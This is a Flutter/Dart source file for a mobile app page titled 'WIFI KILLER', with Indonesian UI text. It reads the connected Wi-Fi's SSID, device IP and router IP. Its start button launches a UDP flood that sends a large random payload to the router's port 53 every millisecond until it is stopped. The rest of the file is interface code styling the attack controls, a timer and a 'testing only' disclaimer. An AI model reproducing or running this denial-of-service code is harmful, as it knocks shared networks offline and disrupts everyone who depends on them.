import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

// ── COLOR SCHEME (sama persis dengan DashboardPage) ─────────────────────────
class _C {
  static const bg      = Color(0xFF0c0d15);
  static const bg2     = Color(0xFF11121c);
  static const surface = Color(0xFF161823);
  static const card    = Color(0xFF1a1c29);
  static const accent  = Color(0xFFe8184a);
  static const accent2 = Color(0xFFff4466);
  static const accent3 = Color(0xFFff8099);
  static const gold    = Color(0xFFFFD447);
  static const danger  = Color(0xFFFF4D6D);
  static const text    = Color(0xFFE2EAE5);
  static const muted   = Color(0x73E2EAE5);
  static const muted2  = Color(0x38E2EAE5);
  static const border  = Color(0x1AE8184A);
  static const border2 = Color(0x0FFFFFFF);
  static const greenG1 = Color(0xFF25D366);
  static const greenG2 = Color(0xFF18a84c);
  static const blueG1  = Color(0xFF229ED9);
  static const blueG2  = Color(0xFF0072aa);
  static const purpleG1= Color(0xFF9C27B0);
  static const orangeG1= Color(0xFFFF8C00);
  static const orangeG2= Color(0xFFcc6a00);
  static const redG1   = Color(0xFFFF4D6D);
  static const redG2   = Color(0xFFcc2244);
}

// ── WIFI KILLER PAGE ─────────────────────────────────────────────────────────
class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> with TickerProviderStateMixin {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  bool _permissionGranted = false;
  Timer? _loopTimer;
  int _attackSeconds = 0;
  Timer? _secondTimer;

  // Pulse animation for attacking state
  late AnimationController _pulseController;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    )..repeat(reverse: true);
    _loadWifiInfo();
  }

  // ── Network Info ───────────────────────────────────────────────────────────
  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();

    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.", isSuccess: false);
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
        _permissionGranted = true;
      });
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
        _permissionGranted = false;
      });
    }
  }

  // ── Attack Logic ──────────────────────────────────────────────────────────
  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("Error", "Router IP tidak tersedia. Pastikan terhubung WiFi.", isSuccess: false);
      return;
    }

    setState(() {
      isKilling = true;
      _attackSeconds = 0;
    });

    _secondTimer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (mounted) setState(() => _attackSeconds++);
    });

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });

    _showAlert("Attack Started", "WiFi flood attack aktif.\nTekan STOP untuk menghentikan.", isSuccess: true);
  }

  void _stopFlood() {
    _loopTimer?.cancel();
    _loopTimer = null;
    _secondTimer?.cancel();
    _secondTimer = null;
    setState(() => isKilling = false);
    _showAlert("Attack Stopped", "WiFi flood attack dihentikan setelah $_attackSeconds detik.", isSuccess: false);
  }

  String _formatDuration(int seconds) {
    final m = (seconds ~/ 60).toString().padLeft(2, '0');
    final s = (seconds % 60).toString().padLeft(2, '0');
    return '$m:$s';
  }

  // ── Dialog ─────────────────────────────────────────────────────────────────
  void _showAlert(String title, String message, {bool isSuccess = false}) {
    final color = isSuccess ? _C.greenG1 : _C.danger;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _C.surface.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: color.withOpacity(0.4), width: 1),
        ),
        title: Row(
          children: [
            Container(
              width: 36, height: 36,
              decoration: BoxDecoration(color: color.withOpacity(0.12), borderRadius: BorderRadius.circular(10)),
              child: Icon(isSuccess ? Icons.play_arrow : Icons.warning_amber_rounded, color: color, size: 18),
            ),
            const SizedBox(width: 12),
            Text(title, style: TextStyle(color: _C.text, fontFamily: 'MADEEvolveSansEVO', fontSize: 14)),
          ],
        ),
        content: Text(message, style: TextStyle(color: _C.muted, fontSize: 14)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
              decoration: BoxDecoration(color: color, borderRadius: BorderRadius.circular(10)),
              child: Text('OK', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 11, fontWeight: FontWeight.bold, color: Colors.white)),
            ),
          ),
        ],
      ),
    );
  }

  // ── BUILD ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      appBar: AppBar(
        backgroundColor: _C.bg2,
        elevation: 0,
        centerTitle: false,
        title: Row(
          children: [
            Container(
              width: 36, height: 36,
              decoration: BoxDecoration(
                color: _C.redG1.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _C.redG1.withOpacity(0.25)),
              ),
              child: Icon(FontAwesomeIcons.wifi, color: _C.redG1, size: 15),
            ),
            const SizedBox(width: 12),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('WIFI KILLER', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 13, fontWeight: FontWeight.bold, color: _C.text)),
                Text('Internal Network', style: TextStyle(fontSize: 10, color: _C.muted)),
              ],
            ),
          ],
        ),
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 8),
            child: GestureDetector(
              onTap: _loadWifiInfo,
              child: Container(
                width: 38, height: 38,
                decoration: BoxDecoration(
                  color: _C.surface,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _C.border2),
                ),
                child: Icon(Icons.refresh, color: _C.muted, size: 16),
              ),
            ),
          ),
        ],
        iconTheme: IconThemeData(color: _C.text),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(height: 1, color: _C.border),
        ),
      ),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ── Info Card ──
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(18),
                border: Border.all(color: _C.border),
              ),
              child: Row(
                children: [
                  Container(
                    width: 48, height: 48,
                    decoration: BoxDecoration(
                      color: _C.redG1.withOpacity(0.12),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _C.redG1.withOpacity(0.25)),
                    ),
                    child: Icon(FontAwesomeIcons.radiation, color: _C.redG1, size: 20),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text('LOCAL NETWORK ATTACK', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 12, fontWeight: FontWeight.bold, color: _C.text, letterSpacing: 1)),
                        const SizedBox(height: 2),
                        Text('Mematikan jaringan WiFi yang tersambung. Gunakan hanya untuk testing.', style: TextStyle(fontSize: 12, color: _C.muted)),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // ── Warning Card ──
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: _C.gold.withOpacity(0.06),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _C.gold.withOpacity(0.2)),
              ),
              child: Row(
                children: [
                  Container(
                    width: 36, height: 36,
                    decoration: BoxDecoration(color: _C.gold.withOpacity(0.12), borderRadius: BorderRadius.circular(10)),
                    child: Icon(FontAwesomeIcons.triangleExclamation, color: _C.gold, size: 14),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'Hanya untuk testing pribadi. Segala risiko ditanggung pengguna.',
                      style: TextStyle(color: _C.gold, fontSize: 12, fontWeight: FontWeight.w500),
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // ── Network Info Section ──
            Row(
              children: [
                Container(
                  width: 4, height: 18,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [_C.blueG1, _C.purpleG1]),
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 10),
                Text('NETWORK INFORMATION', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 12, fontWeight: FontWeight.bold, color: _C.text, letterSpacing: 1)),
                const Spacer(),
                if (_permissionGranted)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                    decoration: BoxDecoration(
                      color: _C.greenG1.withOpacity(0.12),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: _C.greenG1.withOpacity(0.25)),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.check_circle, color: _C.greenG1, size: 10),
                        const SizedBox(width: 4),
                        Text('CONNECTED', style: TextStyle(color: _C.greenG1, fontSize: 8, fontWeight: FontWeight.bold, fontFamily: 'MADEEvolveSansEVO', letterSpacing: 0.5)),
                      ],
                    ),
                  ),
              ],
            ),
            const SizedBox(height: 14),

            // Info cards
            _infoCard('SSID', ssid, FontAwesomeIcons.wifi, _C.blueG1),
            const SizedBox(height: 10),
            _infoCard('DEVICE IP', ip, FontAwesomeIcons.mobileScreen, _C.greenG1),
            const SizedBox(height: 10),
            _infoCard('ROUTER IP', routerIp, FontAwesomeIcons.server, _C.purpleG1),
            const SizedBox(height: 10),
            _infoCard('FREQUENCY', '$frequency MHz', FontAwesomeIcons.signal, _C.orangeG1),
            const SizedBox(height: 24),

            // ── Attack Module Section ──
            Row(
              children: [
                Container(
                  width: 4, height: 18,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [isKilling ? _C.danger : _C.redG1, isKilling ? _C.accent2 : _C.redG2]),
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 10),
                Text('ATTACK MODULE', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 12, fontWeight: FontWeight.bold, color: _C.text, letterSpacing: 1)),
              ],
            ),
            const SizedBox(height: 14),

            // Attack control card
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(18),
                border: Border.all(color: isKilling ? _C.danger.withOpacity(0.3) : _C.border),
              ),
              child: Column(
                children: [
                  // Status indicator
                  _buildAttackStatus(),
                  const SizedBox(height: 16),
                  Container(height: 1, color: _C.border2),
                  const SizedBox(height: 16),

                  // Config chips
                  Row(
                    children: [
                      _configChip(FontAwesomeIcons.bullseye, 'TARGET', routerIp),
                      const SizedBox(width: 8),
                      _configChip(FontAwesomeIcons.bolt, 'PORT', '53'),
                      const SizedBox(width: 8),
                      _configChip(FontAwesomeIcons.paperPlane, 'METHOD', 'UDP Flood'),
                    ],
                  ),
                  const SizedBox(height: 20),

                  // Attack button
                  SizedBox(
                    width: double.infinity,
                    height: 58,
                    child: ElevatedButton(
                      onPressed: isKilling ? _stopFlood : _startFlood,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: isKilling ? _C.surface : _C.danger,
                        foregroundColor: isKilling ? _C.danger : Colors.white,
                        disabledBackgroundColor: _C.surface,
                        disabledForegroundColor: _C.muted2,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                        elevation: 0,
                      ),
                      child: isKilling
                          ? Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(FontAwesomeIcons.stop, size: 16),
                                const SizedBox(width: 10),
                                Text('STOP ATTACK', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1)),
                              ],
                            )
                          : Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(FontAwesomeIcons.wifi, size: 16),
                                const SizedBox(width: 10),
                                Text('START KILL', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1)),
                              ],
                            ),
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 30),

            // ── Footer ──
            _buildFooter(),
            const SizedBox(height: 20),
          ],
        ),
      ),
    );
  }

  // ── Attack Status ──────────────────────────────────────────────────────────
  Widget _buildAttackStatus() {
    if (isKilling) {
      return AnimatedBuilder(
        animation: _pulseController,
        builder: (_, __) {
          final v = _pulseController.value;
          return Container(
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: _C.danger.withOpacity(0.06 + v * 0.06),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _C.danger.withOpacity(0.2 + v * 0.2)),
            ),
            child: Row(
              children: [
                Container(
                  width: 12, height: 12,
                  decoration: BoxDecoration(
                    color: _C.danger,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(color: _C.danger, blurRadius: 8 + v * 6, spreadRadius: 1 + v * 2),
                    ],
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text('ATTACKING', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 11, fontWeight: FontWeight.bold, color: _C.danger, letterSpacing: 1)),
                      const SizedBox(height: 2),
                      Text('UDP flood sedang berjalan ke $routerIp', style: TextStyle(color: _C.muted, fontSize: 11)),
                    ],
                  ),
                ),
                // Timer
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: _C.danger.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Text(
                    _formatDuration(_attackSeconds),
                    style: TextStyle(color: _C.danger, fontSize: 16, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono', letterSpacing: 1),
                  ),
                ),
              ],
            ),
          );
        },
      );
    }

    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(14),
      ),
      child: Row(
        children: [
          Container(
            width: 12, height: 12,
            decoration: BoxDecoration(
              color: _C.muted2,
              shape: BoxShape.circle,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('STANDBY', style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 11, fontWeight: FontWeight.bold, color: _C.muted, letterSpacing: 1)),
                const SizedBox(height: 2),
                Text('Siap menjalankan serangan.', style: TextStyle(color: _C.muted2, fontSize: 11)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: _C.greenG1.withOpacity(0.1),
              borderRadius: BorderRadius.circular(6),
              border: Border.all(color: _C.greenG1.withOpacity(0.2)),
            ),
            child: Text('READY', style: TextStyle(color: _C.greenG1, fontSize: 9, fontWeight: FontWeight.bold, fontFamily: 'MADEEvolveSansEVO', letterSpacing: 0.5)),
          ),
        ],
      ),
    );
  }

  // ── Info Card ──────────────────────────────────────────────────────────────
  Widget _infoCard(String label, String value, IconData icon, Color iconColor) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.border),
      ),
      child: Row(
        children: [
          Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: iconColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Icon(icon, color: iconColor, size: 16),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(label, style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 9, color: _C.muted, letterSpacing: 1)),
                const SizedBox(height: 2),
                Text(
                  value,
                  style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w600, fontFamily: 'ShareTechMono'),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── Config Chip ────────────────────────────────────────────────────────────
  Widget _configChip(IconData icon, String label, String value) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
        decoration: BoxDecoration(
          color: _C.surface,
          borderRadius: BorderRadius.circular(10),
        ),
        child: Row(
          children: [
            Icon(icon, color: _C.muted2, size: 11),
            const SizedBox(width: 6),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(label, style: TextStyle(fontSize: 8, color: _C.muted2, fontFamily: 'MADEEvolveSansEVO', letterSpacing: 0.5)),
                Text(
                  value,
                  style: TextStyle(fontSize: 10, color: _C.text, fontWeight: FontWeight.w600, fontFamily: 'ShareTechMono'),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ── Footer ────────────────────────────────────────────────────────────────
  Widget _buildFooter() {
    return Column(
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 6, height: 6,
              decoration: BoxDecoration(
                color: isKilling ? _C.danger : _C.greenG1,
                shape: BoxShape.circle,
                boxShadow: [BoxShadow(color: isKilling ? _C.danger : _C.greenG1, blurRadius: 4)],
              ),
            ),
            const SizedBox(width: 8),
            Text(
              isKilling ? 'ATTACK ACTIVE' : 'SECURE CONNECTION',
              style: TextStyle(fontFamily: 'MADEEvolveSansEVO', fontSize: 9, color: isKilling ? _C.danger : _C.muted2, letterSpacing: 1),
            ),
            const SizedBox(width: 12),
            Icon(isKilling ? FontAwesomeIcons.radiation : Icons.fingerprint, color: isKilling ? _C.danger : _C.muted2, size: 12),
          ],
        ),
        const SizedBox(height: 4),
        Text('SYAHID • ENCRYPTED', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: _C.muted2, letterSpacing: 1.5)),
      ],
    );
  }

  @override
  void dispose() {
    _stopFlood();
    _pulseController.dispose();
    super.dispose();
  }
}